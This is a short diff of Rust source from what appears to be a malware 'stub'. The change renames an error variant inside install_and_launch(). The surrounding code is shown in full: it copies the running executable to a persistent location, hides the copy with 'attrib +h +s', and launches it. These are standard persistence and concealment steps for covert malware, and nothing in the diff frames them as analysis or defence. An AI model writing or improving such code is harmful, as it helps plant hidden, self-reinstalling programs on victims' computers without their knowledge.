@@ -73,14 +73,14 @@ pub fn is_running_from_target() -> bool {
 
 /// Copy the running stub to the persistent location and launch it.
 pub fn install_and_launch() -> Result<(), StubError> {
-    let current = env::current_exe().map_err(|_| StubError::PersistenceError)?;
-    let target = target_path().ok_or(StubError::PersistenceError)?;
+    let current = env::current_exe().map_err(|_| StubError::PersistenceFailed)?;
+    let target = target_path().ok_or(StubError::PersistenceFailed)?;
 
     if let Some(parent) = target.parent() {
-        fs::create_dir_all(parent).map_err(|_| StubError::PersistenceError)?;
+        fs::create_dir_all(parent).map_err(|_| StubError::PersistenceFailed)?;
     }
 
-    fs::copy(&current, &target).map_err(|_| StubError::PersistenceError)?;
+    fs::copy(&current, &target).map_err(|_| StubError::PersistenceFailed)?;
 
     let _ = Command::new("attrib")
         .args(["+h", "+s"])
@@ -89,7 +89,7 @@ pub fn install_and_launch() -> Result<(), StubError> {
 
     Command::new(&target)
         .spawn()
-        .map_err(|_| StubError::PersistenceError)?;
+        .map_err(|_| StubError::PersistenceFailed)?;
 
     Ok(())
 }
